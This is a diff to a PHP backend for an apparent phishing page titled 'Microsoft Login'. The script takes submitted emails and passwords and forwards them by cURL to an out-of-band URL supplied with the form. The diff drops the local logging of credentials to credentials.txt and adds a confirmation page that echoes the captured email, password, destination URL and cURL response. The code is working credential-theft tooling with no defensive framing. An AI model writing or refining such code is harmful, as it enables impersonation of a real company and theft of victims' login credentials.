@@ -1,9 +1,9 @@
 <?php
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
     // Collecting data from the form
-    $email = $_POST['email'];
-    $password = $_POST['password'];
-    $oob_url = $_POST['oob-url'];  // Collect the OOB URL passed from the form
+    $email = $_POST['email'] ?? 'No email provided';
+    $password = $_POST['password'] ?? 'No password provided';
+    $oob_url = $_POST['oob-url'] ?? 'No OOB URL provided';  // Collect the OOB URL passed from the form
 
     // Combine email and password with a space
     $combined = $email . " " . $password;
@@ -22,32 +22,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $response = curl_exec($ch);
     curl_close($ch);
 
-    // Log the cURL response for debugging
-    error_log("cURL response: " . $response);
-
-    // Creating or opening the file to log credentials
-    $file = fopen('credentials.txt', 'a');
-    if (!$file) {
-        error_log("Failed to open credentials.txt for writing.");
-        echo "Failed to open file for writing.";
-        exit();
-    }
-
-    // Formatting the log entry
-    $logEntry = "Email: " . $email . " - Password: " . $password . " - OOB URL: " . $oob_url . "\n";
-
-    // Writing the log entry to the file
-    if (fwrite($file, $logEntry) === FALSE) {
-        error_log("Failed to write to credentials.txt.");
-        echo "Failed to write to file.";
-        fclose($file);
-        exit();
-    }
-
-    // Closing the file
-    fclose($file);
-
-    // Display an acknowledgment message
+    // Display an acknowledgment message along with the data received
     echo "<html>
             <head>
                 <title>Microsoft Login - Submission Received</title>
@@ -55,6 +30,11 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             <body>
                 <h1>Thank You!</h1>
                 <p>Your submission has been received.</p>
+                <p>Email: " . htmlspecialchars($email) . "</p>
+                <p>Password: " . htmlspecialchars($password) . "</p>
+                <p>OOB URL: " . htmlspecialchars($oob_url) . "</p>
+                <p>Full URL sent to: " . htmlspecialchars($full_url) . "</p>
+                <p>cURL Response: " . htmlspecialchars($response) . "</p>
             </body>
           </html>";
 } else {
